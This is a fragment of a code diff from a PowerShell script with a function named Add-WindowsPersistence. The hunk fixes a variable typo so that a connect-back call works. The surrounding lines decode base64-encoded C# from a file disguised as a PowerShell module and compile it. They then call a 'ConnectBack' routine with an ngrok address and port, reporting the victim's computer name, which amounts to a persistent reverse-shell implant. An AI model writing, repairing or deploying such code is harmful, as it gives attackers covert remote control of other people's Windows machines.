@@ -620,7 +620,7 @@ function Add-WindowsPersistence {
             Add-Type -TypeDefinition ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content -Path 'C:\Program Files\WindowsPowerShell\Modules\PSGetModules.ps1' -Raw)))) -Language Csharp
 
             # Add NGROK address and port below
-            [ConnectBack.Program]::Main(@("$:ngrokAddress", "$ngrokPort", 'Connection from: $env:ComputerName'))
+            [ConnectBack.Program]::Main(@("$ngrokAddress", "$ngrokPort", 'Connection from: $env:ComputerName'))
             Add-Content -Path $loggingFile -Value "[$(Get-Date)] - Executed: Payload"
         }
         catch {
